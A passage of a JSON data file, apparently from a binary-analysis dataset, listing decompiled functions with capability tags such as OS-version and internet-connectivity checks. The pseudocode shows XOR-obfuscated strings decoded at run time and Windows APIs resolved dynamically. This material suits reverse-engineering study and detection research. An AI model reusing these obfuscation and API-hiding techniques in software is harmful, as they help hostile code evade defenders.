            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041bb20(int32_t lpString2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint ARG_0;\n    uint var_78h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uint var_34h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint8_t var_24h [4];\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uchar var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t lpString1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_88h = 8;\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    if (lpString2 == 0) {\n        var_88h = 8;\n    }\n    else {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar1 * 2 + 0x1a);\n        lpString1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (lpString1 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar1 * 2 + 6);\n            var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (var_14h != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString1, lpString2);\n                iVar1 = fcn.0041b350(lpString1, 0x5c);\n                var_34h._0_1_ = 0x60;\n                var_34h._1_1_ = 0x57;\n                var_34h._2_1_ = 0x27;\n                var_34h._3_1_ = 0x78;\n                var_30h = 5;\n                var_2fh = 0x45;\n                var_2eh = 0x79;\n                var_2dh = 0x4b;\n                var_2ch = 0x1a;\n                var_2bh = 0x70;\n                var_2ah = 0x24;\n                var_29h = 0x57;\n                var_28h = 0x3f;\n                var_27h = 0x78;\n                var_26h = 0x70;\n                var_25h = 0x45;\n                var_1ch._0_1_ = 0x45;\n                var_1ch._1_1_ = 0x57;\n                var_1ch._2_1_ = 0x4b;\n                var_1ch._3_1_ = 0x78;\n                var_18h = 0x70;\n                fcn.004012a0(0x20);\n                for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n                    fcn.00401280(var_4h, *(&var_34h + var_4h) ^ *(&var_1ch + var_4h % 5));\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                uVar2 = fcn.00401270(uVar2);\n                (*_sym.imp.USER32.dll_wsprintfW)(iVar1 + 2, uVar2);\n                (*_sym.imp.USER32.dll_wsprintfW)(var_14h, L\"\\\"%s\\\"\", lpString2);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                if (var_10h != 0) {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_78h._0_1_ = 0x13;\n                    var_78h._1_1_ = 0x41;\n                    var_78h._2_1_ = 0x4c;\n                    var_78h._3_1_ = 0x43;\n                    var_74h = 0x10;\n                    var_73h = 8;\n                    var_72h = 0x52;\n                    var_71h = 0x18;\n                    var_70h = 0x4a;\n                    var_6fh = 0x11;\n                    var_6eh = 0x54;\n                    var_6dh = 0x19;\n                    var_6ch = 0x52;\n                    var_6bh = 0x18;\n                    var_6ah = 0x50;\n                    var_69h = 0x11;\n                    var_68h = 0x5c;\n                    var_67h = 0x4f;\n                    var_66h = 0x43;\n                    var_65h = 0x38;\n                    var_64h = 0x32;\n                    var_63h = 0xb;\n                    var_62h = 0x5c;\n                    var_61h = 0x1f;\n                    var_60h = 0x7f;\n                    var_5fh = 0x3f;\n                    var_5eh = 0x5c;\n                    var_5dh = 0x54;\n                    var_5ch = 0x15;\n                    var_5bh = 0x4a;\n                    var_5ah = 0x57;\n                    var_59h = 0x10;\n                    var_58h = 9;\n                    var_57h = 0x3c;\n                    var_56h = 0x73;\n                    var_55h = 3;\n                    var_54h = 0x14;\n                    var_53h = 0x15;\n                    var_52h = 0x5d;\n                    var_51h = 0x49;\n                    var_50h = 0x10;\n                    var_4fh = 0x19;\n                    var_4eh = 6;\n                    var_4dh = 0x15;\n                    var_4ch = 0x1d;\n                    var_4bh = 0x14;\n                    var_4ah = 0x48;\n                    var_49h = 0x4a;\n                    var_48h = 0x15;\n                    var_47h = 0x5a;\n                    var_46h = 0x4c;\n                    var_45h = 0x5e;\n                    var_44h = 0x59;\n                    var_43h = 0x4f;\n                    var_42h = 7;\n                    var_41h = 0x38;\n                    var_40h = 0x32;\n                    var_3fh = 0x55;\n                    var_3eh = 0x1c;\n                    var_3dh = 6;\n                    var_3ch = 0x52;\n                    var_3bh = 0x10;\n                    var_3ah = 0x1d;\n                    var_39h = 1;\n                    var_38h = 0x74;\n                    var_37h = 0x60;\n                    var_36h = 0x72;\n                    var_24h[0] = 0x72;\n                    var_24h[1] = 0x35;\n                    var_24h[2] = 0x38;\n                    var_24h[3] = 0x31;\n                    var_20h = 0x79;\n                    var_1fh = 0x6a;\n                    fcn.004012a0(0x43);\n                    for (var_8h = 0; var_8h < 0x43; var_8h = var_8h + 1) {\n                        fcn.00401280(var_8h, *(&var_78h + var_8h) ^ var_24h[var_8h % 6]);\n                    }\n                    uVar2 = fcn.00401270(uVar2, uVar2);\n                    uVar2 = (*_sym.imp.USER32.dll_wsprintfA)(var_10h, uVar2);\n                    var_88h = fcn.0041ccc0(lpString1, var_10h, uVar2, var_14h, 0);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    fcn.004012d0();\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                fcn.004012d0();\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString1);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n    }\n    return var_88h;\n}\n",
        "token_count": 2613
    },
    "0041c160": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0041c160(int32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    int32_t var_1ch;\n    uint lpFileName;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t lDistanceToMove;\n    int32_t hObject;\n    uint var_1h;\n    \n    var_1ch = 0;\n    iVar2 = fcn.0041c830(arg_8h, &lpFileName);\n    if (iVar2 == 0) {\n        var_10h = fcn.0041b470(arg_8h, arg_ch, 0);\n        if ((var_10h != 0) && (lDistanceToMove = fcn.0041b5f0(arg_8h, var_10h - arg_8h),  lDistanceToMove != 0)) {\n            var_1h._0_1_ = '\\0';\n            if (((*0x436b50 & 1) != 0) && (iVar2 = fcn.0041b450(arg_8h),  *(iVar2 + 4) == 0x14c)) {\n                cVar1 = fcn.0041c910(1);\n                var_1h._0_1_ = cVar1 == '\\0';\n                var_14h = var_1h;\n            }\n            hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (hObject != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(hObject, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(hObject, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_1ch = arg_8h + lpBuffer;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            }\n            if (var_1h != '\\0') {\n                fcn.0041c910(0);\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return var_1ch;\n}\n",
        "token_count": 624
    },
    "0041c2b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c2b0(uint arg_8h, int32_t lpString2, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_20h;\n    uint lpString1;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t *var_ch;\n    uint32_t var_8h;\n    uint32_t *lpAddress;\n    \n    var_14h = 2;\n    lpAddress = NULL;\n    fcn.0041c600(*0x436b48, 0);\n    fcn.0041cd80(arg_8h, 0, 0, &var_10h);\n    var_8h = var_10h;\n    lpAddress = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_10h, 0x3000, 4);\n    while (((lpAddress != NULL && (iVar1 = fcn.0041cd80(arg_8h, lpAddress, var_8h, &var_10h),  iVar1 == 0)) &&\n           (var_8h < var_10h))) {\n        var_8h = var_10h;\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n        lpAddress = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_8h, 0x3000, 4);\n    }\n    if ((lpAddress == NULL) || (var_8h < var_10h)) {\n        var_14h = 8;\n    }\n    else {\n        var_ch = lpAddress + 2;\n        for (var_18h = 0; var_18h < *lpAddress; var_18h = var_18h + 1) {\n            iVar1 = var_ch + *(var_ch + 0x1e) + 0x20;\n            if ((lpString2 == 0) || (iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(iVar1, lpString2),  iVar2 == 0)) {\n                var_14h = 0;\n                break;\n            }\n            puVar3 = fcn.0041b2e0(iVar1, 0x2e);\n            if (puVar3 != NULL) {\n                *puVar3 = 0;\n                iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(iVar1, lpString2);\n                if (iVar1 == 0) {\n                    var_14h = 0;\n                    break;\n                }\n            }\n            var_ch = var_ch + 0x48;\n        }\n        if (var_14h == 0) {\n            *arg_10h = var_ch[2];\n            arg_10h[1] = var_ch[3];\n            if (arg_14h != NULL) {\n                *arg_14h = var_ch[4];\n            }\n        }\n    }\n    if (lpAddress != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n    }\n    return var_14h;\n}\n",
        "token_count": 741
    },
    "0041c600": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041c600(int32_t arg_8h, int32_t hObject)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_44h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uint8_t var_34h [4];\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uint var_24h;\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    if (*0x436b0c == NULL) {\n        var_44h._0_1_ = 0x2b;\n        var_44h._1_1_ = 0x2a;\n        var_44h._2_1_ = 0x3e;\n        var_44h._3_1_ = 0x20;\n        var_40h = 0x2f;\n        var_3fh = 0x7d;\n        var_3eh = 0x56;\n        var_3dh = 9;\n        var_3ch = 0x1b;\n        var_3bh = 0x20;\n        var_3ah = 0x3b;\n        var_39h = 0x2e;\n        var_38h = 0x11;\n        var_37h = 0x2a;\n        var_36h = 0x69;\n        var_1ch._0_1_ = 0x62;\n        var_1ch._1_1_ = 0x59;\n        var_1ch._2_1_ = 0x69;\n        var_1ch._3_1_ = 0x4f;\n        var_18h = 0x58;\n        var_17h = 0x4b;\n        fcn.004012a0(0xf);\n        for (var_4h = 0; var_4h < 0xf; var_4h = var_4h + 1) {\n            fcn.00401280(var_4h, *(&var_44h + var_4h) ^ *(&var_1ch + var_4h % 6));\n        }\n        var_34h[0] = 0xd;\n        var_34h[1] = 0x51;\n        var_34h[2] = 0x36;\n        var_34h[3] = 0x5a;\n        var_30h = 0x3f;\n        var_2fh = 0;\n        var_2eh = 0x55;\n        var_2dh = 6;\n        var_2ch = 0x6a;\n        var_2bh = 0x50;\n        var_2ah = 0x36;\n        var_29h = 0;\n        var_28h = 0x66;\n        var_24h._0_1_ = 0x66;\n        var_24h._1_1_ = 0x34;\n        var_24h._2_1_ = 0x44;\n        var_24h._3_1_ = 0x34;\n        var_20h = 0x5a;\n        var_1fh = 0x6c;\n        fcn.004012a0(0xd);\n        for (var_8h = 0; var_8h < 0xd; var_8h = var_8h + 1) {\n            fcn.00401280(var_8h, var_34h[var_8h] ^ *(&var_24h + var_8h % 6));\n        }\n        uVar1 = fcn.00401270();\n        uVar1 = fcn.00401270(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n        *0x436b0c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        fcn.004012d0();\n        fcn.004012d0();\n    }\n    if (*0x436b0c != NULL) {\n        if (arg_8h != 0) {\n            hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, arg_8h);\n        }\n        if (hObject != 0) {\n            iVar2 = (**0x436b0c)(hObject, &var_14h);\n            if (iVar2 == 0) {\n                var_14h = 0;\n            }\n            if (arg_8h != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 1239
    },
    "0041c830": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c830(uint hModule, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t nSize;\n    int32_t lpFilename;\n    \n    var_10h = 0;\n    nSize = 0x104;\n    var_ch = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpFilename = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    while (((lpFilename != 0 &&\n            (var_ch = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(hModule, lpFilename, nSize),  var_ch != 0)) &&\n           (nSize == var_ch))) {\n        nSize = nSize + 0x104;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFilename);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, nSize * 2);\n        lpFilename = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    }\n    if (lpFilename == 0) {\n        var_10h = 8;\n    }\n    else if (var_ch == 0) {\n        var_10h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFilename);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    else {\n        *arg_ch = lpFilename;\n    }\n    return var_10h;\n}\n",
        "token_count": 389
    },
    "0041c910": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0041c910(uint32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_54h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uint8_t var_34h [4];\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uint var_24h;\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uchar var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    uVar2 = in_EAX & 0xffffff00;\n    var_2h._0_1_ = *0x436690;\n    if (*0x436b38 == NULL) {\n        var_54h._0_1_ = 0x16;\n        var_54h._1_1_ = 6;\n        var_54h._2_1_ = 0x12;\n        var_54h._3_1_ = 0;\n        var_50h = 100;\n        var_4fh = 4;\n        var_4eh = 7;\n        var_4dh = 4;\n        var_4ch = 0x54;\n        var_4bh = 0x3c;\n        var_4ah = 0x24;\n        var_49h = 0x3e;\n        var_48h = 10;\n        var_47h = 0x41;\n        var_46h = 0x66;\n        var_45h = 0x75;\n        var_44h = 0x2f;\n        var_43h = 0x16;\n        var_42h = 100;\n        var_41h = 0x35;\n        var_40h = 0x25;\n        var_3fh = 0;\n        var_3eh = 0x17;\n        var_3dh = 0x53;\n        var_3ch = 0x33;\n        var_3bh = 0x35;\n        var_3ah = 0;\n        var_39h = 10;\n        var_38h = 0x58;\n        var_37h = 0x50;\n        var_1ch._0_1_ = 0x41;\n        var_1ch._1_1_ = 0x69;\n        var_1ch._2_1_ = 0x65;\n        var_1ch._3_1_ = 0x36;\n        var_18h = 0x50;\n        fcn.004012a0(0x1e);\n        for (var_8h = 0; var_8h < 0x1e; var_8h = var_8h + 1) {\n            fcn.00401280(var_8h, *(&var_54h + var_8h) ^ *(&var_1ch + var_8h % 5));\n        }\n        var_34h[0] = 0xd;\n        var_34h[1] = 0x51;\n        var_34h[2] = 0x36;\n        var_34h[3] = 0x5a;\n        var_30h = 0x3f;\n        var_2fh = 0;\n        var_2eh = 0x55;\n        var_2dh = 6;\n        var_2ch = 0x6a;\n        var_2bh = 0x50;\n        var_2ah = 0x36;\n        var_29h = 0;\n        var_28h = 0x66;\n        var_24h._0_1_ = 0x66;\n        var_24h._1_1_ = 0x34;\n        var_24h._2_1_ = 0x44;\n        var_24h._3_1_ = 0x34;\n        var_20h = 0x5a;\n        var_1fh = 0x6c;\n        fcn.004012a0(0xd);\n        for (var_ch = 0; var_ch < 0xd; var_ch = var_ch + 1) {\n            fcn.00401280(var_ch, var_34h[var_ch] ^ *(&var_24h + var_ch % 6));\n        }\n        uVar1 = fcn.00401270();\n        uVar1 = fcn.00401270(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n        *0x436b38 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        fcn.004012d0();\n        uVar2 = fcn.004012d0();\n    }\n    if ((*0x436b38 != NULL) && (uVar2 = (**0x436b38)(arg_8h & 0xff),  (uVar2 & 0xff) != 0)) {\n        *0x436690 = arg_8h != 0;\n        uVar2 = uVar2 & 0xffffff00;\n    }\n    return uVar2 & 0xffffff00 | var_2h;\n}\n",
        "token_count": 1449
    },
    "0041ccc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041ccc0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t var_4h;\n    \n    var_4h = fcn.00416790(arg_8h, arg_ch, arg_10h, 1);\n    if (var_4h == 0) {\n        var_4h = fcn.0041bf00(arg_8h, arg_14h, arg_18h);\n    }\n    return var_4h;\n}\n",
        "token_count": 130
    },
    "0041cd10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041cd10(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_28h = 0x18;\n    var_24h = 0;\n    var_1ch = 0x40;\n    var_20h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_ch = 0;\n    var_10h = arg_8h;\n    iVar1 = fcn.0041cb20(&var_8h, 0x1f0fff, &var_28h, &var_10h);\n    if (iVar1 < 0) {\n        var_8h = 0xffffffff;\n    }\n    return var_8h;\n}\n",
        "token_count": 237
    },
    "0041cd80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041cd80(uint arg_8h, int32_t *arg_ch, uint32_t arg_10h, uint32_t *arg_14h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint var_f0h;\n    uint var_e8h;\n    int32_t var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    int32_t var_b4h;\n    uint var_b0h;\n    int32_t var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint32_t var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uchar var_8eh;\n    uchar var_8dh;\n    uchar var_8ch;\n    uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uint var_74h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uint var_50h;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uint8_t var_44h [4];\n    uchar var_40h;\n    uint var_3ch;\n    uchar var_38h;\n    uint var_34h;\n    uchar var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uchar *var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    var_b0h = 0;\n    var_28h = 0;\n    var_14h = 0;\n    var_10h = NULL;\n    var_4h = 0;\n    var_50h._0_1_ = 0x27;\n    var_50h._1_1_ = 0x1f;\n    var_50h._2_1_ = 5;\n    var_50h._3_1_ = 1;\n    var_4ch = 0x3d;\n    var_4bh = 0x67;\n    var_4ah = 0xf;\n    var_49h = 0xd;\n    var_48h = 1;\n    var_47h = 0x51;\n    var_34h._0_1_ = 0x49;\n    var_34h._1_1_ = 0x6b;\n    var_34h._2_1_ = 0x61;\n    var_34h._3_1_ = 0x6d;\n    var_30h = 0x51;\n    fcn.004012a0(10);\n    for (var_18h = 0; var_18h < 10; var_18h = var_18h + 1) {\n        fcn.00401280(var_18h, *(&var_50h + var_18h) ^ *(&var_34h + var_18h % 5));\n    }\n    var_74h._0_1_ = 0x2e;\n    var_74h._1_1_ = 0x43;\n    var_74h._2_1_ = 5;\n    var_74h._3_1_ = 7;\n    var_70h = 0x26;\n    var_6fh = 0x42;\n    var_6eh = 0;\n    var_6dh = 3;\n    var_6ch = 0x1d;\n    var_6bh = 0x34;\n    var_6ah = 6;\n    var_69h = 0x4d;\n    var_68h = 0x1b;\n    var_67h = 6;\n    var_66h = 0x37;\n    var_65h = 0x1b;\n    var_64h = 0x46;\n    var_63h = 0x3f;\n    var_62h = 9;\n    var_61h = 0x25;\n    var_60h = 0x1d;\n    var_5fh = 0x5b;\n    var_5eh = 0x3c;\n    var_5dh = 0x38;\n    var_5ch = 0x23;\n    var_5bh = 0x1b;\n    var_5ah = 0x57;\n    var_59h = 0x37;\n    var_58h = 0x1b;\n    var_57h = 0x22;\n    var_56h = 0x42;\n    var_55h = 0;\n    var_54h = 0x52;\n    var_3ch._0_1_ = 0x74;\n    var_3ch._1_1_ = 0x34;\n    var_3ch._2_1_ = 0x52;\n    var_3ch._3_1_ = 0x68;\n    var_38h = 0x51;\n    fcn.004012a0(0x21);\n    for (var_1ch = 0; var_1ch < 0x21; var_1ch = var_1ch + 1) {\n        fcn.00401280(var_1ch, *(&var_74h + var_1ch) ^ *(&var_3ch + var_1ch % 5));\n    }\n    if ((*0x4383d4 & 1) == 0) {\n        *0x4383d4 = *0x4383d4 | 1;\n        uVar2 = fcn.00401270();\n        *0x4383d0 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar2);\n    }\n    if ((*0x4383d4 & 2) == 0) {\n        *0x4383d4 = *0x4383d4 | 2;\n        uVar2 = fcn.00401270();\n        *0x4383cc = 